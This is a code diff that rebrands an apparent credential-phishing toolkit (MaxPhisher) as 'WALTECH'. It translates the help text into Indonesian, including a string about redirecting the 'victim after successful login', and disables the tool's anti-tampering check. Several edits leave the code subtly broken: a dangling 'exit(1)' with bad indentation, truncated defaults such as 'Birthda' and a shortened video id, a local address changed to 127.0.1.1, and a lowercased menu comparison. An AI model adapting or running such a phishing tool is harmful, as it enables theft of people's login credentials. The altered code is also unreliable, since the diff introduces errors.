@@ -79,13 +79,14 @@ info2  =   f"{green}[{white}•{green}] {purple}"
 
 
 logo = f"""
-{red} __  __            ____  _     _     _
-{cyan}|  \/  | __ ___  _|  _ \| |__ (_)___| |__   ___ _ __
-{yellow}| |\/| |/ _` \ \/ / |_) | '_ \| / __| '_ \ / _ \ '__|
-{blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
-{red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
-{yellow}{" "*35}         [{blue}v{version[:3]}{yellow}]
-{cyan}{" "*36}[{blue}By {green}\42\6F\74\50\68\69\73\65\72{cyan}]
+{red} **       **     **     **       ********** ********   ******  **      **
+{red}/**      /**    ****   /**      /////**/// /**/////   **////**/**     /**
+{red}/**   *  /**   **//**  /**          /**    /**       **    // /**     /**
+{red}/**  *** /**  **  //** /**          /**    /******* /**       /**********
+{white}/** **/**/** **********/**          /**    /**////  /**       /**//////**
+{white}/**** //****/**//////**/**          /**    /**      //**    **/**     /**
+{white}/**/   ///**/**     /**/********    /**    /******** //****** /**     /**
+{white}//       // //      // ////////     //     ////////   //////  //      //
 """
 
 lx_help = f"""
@@ -96,18 +97,18 @@ lx_help = f"""
 {blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
 """
 shadow_help="""
-Shadow url is the url from which website previews are copied.
-When sending url through social media like facebook/telegram, 
-the previews are shown just below the url
+URL bayangan adalah url tempat pratinjau situs web disalin.
+Saat mengirim url melalui media sosial seperti facebook/telegram,
+pratinjau ditampilkan tepat di bawah url
 """
 redir_help="""
-Redirection url is the url which is used to redirect victim after successful login
+Redirection url adalah url yang digunakan untuk mengarahkan korban setelah berhasil login
 """
 curl_help="""
-Just a shortened url with your own masking
+Hanya url yang dipersingkat dengan masking Anda sendiri
 """
 zip_help="""
-Add more templates from a zip file which will be downloaded from input url
+Tambahkan lebih banyak templat dari file zip yang akan diunduh dari url masukan
 """
 
 packages = [ "git", "php", "ssh" ]
@@ -212,7 +213,7 @@ info_json = "info.json"
 location_json = "location.json" 
 email_file = "files/email.json"
 error_file = "error.log"
-is_mail_ok = False
+is_mail_ok = True
 redir_url = ""
 email = ""
 password = ""
@@ -234,8 +235,8 @@ print(f"\n{info}Please wait!{nc}")
 
 default_port = 8080
 default_tunneler = "Cloudflared"
-default_fest = "Birthday"
-default_ytid = "6hHmkInZkMQ"
+default_fest = "Birthda"
+default_ytid = "6hHmkInZkM"
 default_duration = 5000
 default_type = "2"
 default_template = "1"
@@ -285,7 +286,7 @@ key = args.nokey if mode != "test" else False
 update = args.noupdate
 kshrt = args.kshrt
 
-local_url = f"127.0.0.1:{port}"
+local_url = f"127.0.1.1:{port}"
 
 ts_commands = {
     "cloudflared": f"{cf_command} tunnel -url {local_url}",
@@ -434,7 +435,7 @@ def show_file_data(file):
     cprint(
         Panel(
             text.strip(),
-            title="[bold green]\42\6F\74\50\68\69\73\65\72[/][cyan] Data[/]", 
+            title="[bold green]\61\74\74\61\63\63\6B\6B\6B[/][cyan] Data[/]", 
             title_align="left",
             border_style="blue",
         )
@@ -535,10 +536,10 @@ def exception_handler(e):
     lines_no = ", ".join(lines_arr)
     print(f"{error}{name}: {message} at lines {lines_no}")
     
-if sha256(logo.encode("utf-8")).hexdigest() != "101490b6a745ce1aa56c41f477b54fac5f3fddda798105e1a6090fb8eb52fdfb":
-    print(f"{info}Visit: {repo_url}")
-    bgtask(f"xdg-open {repo_url}")
-    delete(__file__)
+#if sha256(logo.encode("utf-8")).hexdigest() != "d400fdbf8a1ac01ce8cedd7fdd736ea627a8e87bba1da06da82aba96c5854b44":
+   # print(f"{info}Visit: {repo_url}")
+   # bgtask(f"xdg-open {repo_url}")
+   # delete(__file__)
     exit(1)
    
 # Website chooser
@@ -552,7 +553,7 @@ def show_options(sites, is_main=True, is_login=False):
         new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
         # To fullfill max length of a part we append empty space
         space = " " * (max_len - len(sites[index]))
-        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
+        return f"{green}[{white}{new_index}{green}] {green}{sites[index]}{space}"
     # Array index starts from 0
     first_index = 0
     # Three columns
@@ -580,7 +581,7 @@ def show_options(sites, is_main=True, is_login=False):
             options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
     lolcat(options)
 # Clear the screen and show logo
-def clear(fast=False, lol=False):
+def clear(fast=True, lol=False):
     shell("clear")
     if fast:
         print(logo)
@@ -1350,7 +1351,7 @@ def secondary_menu(sites, name):
     while True:
         clear(lol=True)
         if len(sites) > 1:
-            show_options(names, is_main=False, is_login=True if name=="Login" else False)
+            show_options(names, is_main=False, is_login=True if name=="login" else False)
         else:
             site = sites[0]
             folder = site["folder"]
